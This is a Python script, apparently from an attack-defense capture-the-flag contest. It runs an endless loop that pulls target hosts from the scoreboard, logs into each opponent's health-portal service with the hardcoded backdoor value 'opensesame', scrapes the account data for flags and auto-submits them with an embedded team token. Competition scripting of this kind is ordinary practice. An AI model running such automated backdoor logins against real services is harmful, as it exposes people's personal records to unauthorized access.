#!/usr/bin/env python3

import requests
import json
import time
from bs4 import BeautifulSoup

# true loop keeps script looping forever
while True:
    # grab list of live flags from metactf scoreboard
    r = requests.get('https://scoreboard.mctf.io:8000/live_flags', verify=False, headers={'Team-Token':'qn7gWWKBkFvuRCtY'})
    # parse reponse as json
    jsonResponse = r.json()

    for data in jsonResponse:
        # service_id 1 is the health_portal web service
        if data['service_id'] == 1:
            # ignore expired flags
            if data['expiration'] > time.time():
                email = data['flag_identifier']
                target = data['hostname']
                # vuln code on ln 68 hardcodes opensesame
                ssn = 'opensesame'

                # email=<>&ssn=<>
                params = {'email':email,'ssn':'opensesame'}
                # post req to get account info
                r = requests.get(f'http://{target}/view_info', params=params)
                # parse req resp into soup object
                soup = BeautifulSoup(r.text, 'html.parser')
                # select div that flags inside
                flags = soup.find_all('div', {'class': 'card-body'})
                for i in flags:
                    # strip whitespace from flag
                    flag = i.text.strip()
                    # only submit if flag valid format
                    if flag[:4] == 'META':
                        # post flag to scoreboard api
                        uri = "https://scoreboard.mctf.io:8000/submit"
                        params = {'flag_in':flag}
                        r2 = requests.post(uri, data=params, headers={'Team-Token':'qn7gWWKBkFvuRCtY'}, verify=False, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"})
                        # print to stdout for visual confirmation while running
                        print(f"Submitted Host: {target}\tFlag: {flag}")
